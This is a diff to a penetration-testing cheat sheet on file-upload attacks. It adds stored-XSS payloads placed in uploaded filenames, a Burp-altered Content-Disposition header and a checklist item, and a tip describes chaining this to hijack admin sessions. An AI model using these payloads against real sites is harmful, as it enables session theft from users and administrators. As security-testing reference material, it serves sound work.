@@ -441,6 +441,26 @@ exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg
 
 Then change `Content-Type` to `text/html` in the serve response (or via another vuln) to trigger execution.
 
+### Filename — Stored XSS
+
+When the app reflects the filename back in HTML (upload success message, file list, gallery), a payload in the filename itself triggers stored XSS in any user who views the page.
+
+```bash
+# Rename file to XSS payload before uploading
+"><img src=x onerror=alert(window.origin)>.jpg
+"><script>alert(1)</script>.jpg
+';alert(1)//.jpg
+
+# In Burp — intercept upload, change filename parameter:
+Content-Disposition: form-data; name="file"; filename=""><img src=x onerror=alert(1)>.jpg"
+
+# If the app stores the original filename and shows it to admins:
+# → stored XSS in the admin panel — high impact
+```
+
+> [!tip]
+> Test this even when you can't execute server-side code. If admins review uploaded files and the filename is rendered unsanitized, this becomes an XSS→session hijack chain targeting privileged users.
+
 ---
 
 ## Polyglot Files
@@ -752,6 +772,7 @@ url=http://<collaborator-url>/test
 [ ] Discover upload path if not disclosed
 [ ] Try LFI+upload chain if LFI exists
 [ ] SVG/XXE if image uploads accepted
+[ ] XSS in filename — app reflects filename in response? try "><img src=x onerror=alert(1)>.jpg
 [ ] Race condition if validation window exists
 [ ] Zip/tar upload? → test Zip Slip path traversal
 [ ] Image processing on server? → test ImageTragick (MVG/SVG payload)
@@ -762,5 +783,5 @@ url=http://<collaborator-url>/test
 ---
 
 *Created: 2026-03-02*
-*Updated: 2026-05-13*
+*Updated: 2026-05-14*
 *Model: claude-sonnet-4-6*
